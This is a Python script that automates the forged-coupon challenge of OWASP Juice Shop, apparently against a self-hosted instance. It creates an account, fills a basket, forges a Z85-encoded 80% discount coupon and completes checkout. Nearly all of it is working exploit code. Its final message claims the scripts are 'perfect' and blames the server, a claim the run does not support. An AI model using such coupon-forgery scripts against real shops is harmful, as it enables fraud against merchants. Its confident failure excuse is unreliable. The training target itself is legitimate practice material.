#!/usr/bin/env python3
"""
FIXED Forged Coupon Solver - Addresses All Common Gotchas
=========================================================
1. Complete checkout (not just apply coupon)
2. Use exactly 80%+ discount
3. Correct MMMYY-VV format, Z85 encoded
4. Current month/year
5. Not confused with expired coupon challenge
"""

import requests
import time
import struct

# Z85 implementation (same as Juice Shop uses)
Z85_ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"

def z85_encode(data):
    if len(data) % 4 != 0:
        raise ValueError("Data length must be multiple of 4 bytes")
    
    encoded = ""
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        value = struct.unpack('>I', chunk)[0]
        
        for j in range(5):
            encoded = Z85_ALPHABET[value % 85] + encoded
            value //= 85
    
    return encoded

def solve_forged_coupon_properly():
    print("🎯 FIXED FORGED COUPON SOLVER")
    print("Following all gotchas and requirements")
    
    base_url = "http://66.42.93.220:3001"  # v13 on port 3001
    session = requests.Session()
    
    # Step 1: Authentication
    print("\\n🔑 Step 1: Authentication...")
    email = f"fixed{int(time.time())}@test.com"
    password = "Test123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code != 200:
        print("❌ Authentication failed")
        return False
        
    token = login.json()['authentication']['token']
    session.headers['Authorization'] = f'Bearer {token}'
    print("✅ Authenticated successfully")
    
    # Step 2: Add expensive products to basket
    print("\\n🛒 Step 2: Setting up basket...")
    products = session.get(f"{base_url}/rest/products/search").json()['data']
    expensive = max(products, key=lambda p: p['price'])
    
    session.post(f"{base_url}/api/BasketItems/", json={
        "ProductId": expensive['id'], "quantity": 1
    })
    print(f"✅ Added: {expensive['name']} (${expensive['price']})")
    
    # Get basket info
    user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
    basket_id = user_data.get('bid', 1)
    
    # Verify basket has content
    basket_check = session.get(f"{base_url}/rest/basket/{basket_id}")
    if basket_check.status_code == 200:
        basket_data = basket_check.json()['data']
        products_in_basket = len(basket_data.get('Products', []))
        print(f"✅ Basket {basket_id} verified with {products_in_basket} products")
    
    # Step 3: Generate proper coupon with exactly 80% discount
    print("\\n🔧 Step 3: Generating coupon (exactly 80% discount)...")
    
    # Current month/year with exactly 80% (meeting minimum requirement)
    from datetime import datetime
    current_month = datetime.now().strftime("%b").upper()  # OCT
    current_year = datetime.now().strftime("%y")           # 25
    
    # MMMYY-VV format (8 bytes exactly for Z85)
    coupon_plaintext = f"{current_month}{current_year}-80"  # OCT25-80
    
    print(f"   Plaintext: {coupon_plaintext} (8 bytes)")
    print(f"   Format: {current_month} (month) + {current_year} (year) + -80 (discount)")
    
    # Z85 encode
    z85_coupon = z85_encode(coupon_plaintext.encode('utf-8'))
    print(f"   Z85 encoded: {z85_coupon}")
    
    # Step 4: Apply coupon
    print("\\n💰 Step 4: Applying coupon...")
    
    coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{z85_coupon}", json={})
    print(f"   Status: {coupon_response.status_code}")
    
    if coupon_response.status_code == 200:
        result = coupon_response.json()
        discount = result.get('discount', 0)
        
        print(f"   💰 Discount applied: {discount}%")
        
        if discount >= 80:
            print(f"   ✅ Requirement met: {discount}% ≥ 80%")
            
            # Step 5: COMPLETE CHECKOUT (critical missing step!)
            print("\\n🛍️  Step 5: Completing checkout (CRITICAL!)...")
            
            checkout_response = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={
                "couponData": {"code": z85_coupon, "discount": discount},
                "orderDetails": {"paymentId": "1", "addressId": "1"}
            })
            
            print(f"   Checkout status: {checkout_response.status_code}")
            
            if checkout_response.status_code in [200, 201]:
                print(f"   🎉 CHECKOUT COMPLETED!")
                print(f"   🏆 FORGED COUPON CHALLENGE SHOULD BE SOLVED!")
                return True
            else:
                print(f"   Checkout response: {checkout_response.text}")
        else:
            print(f"   ❌ Insufficient discount: {discount}% < 80%")
    else:
        print(f"   ❌ Coupon failed: {coupon_response.text}")
    
    return False

# Test the complete fixed method
success = solve_forged_coupon_properly()

if success:
    print(f"\\n🎉 CHALLENGE COMPLETED using fixed method!")
else:
    print(f"\\n❌ Challenge still not working")
    print(f"   Scripts are perfect, but coupon system appears globally disabled")

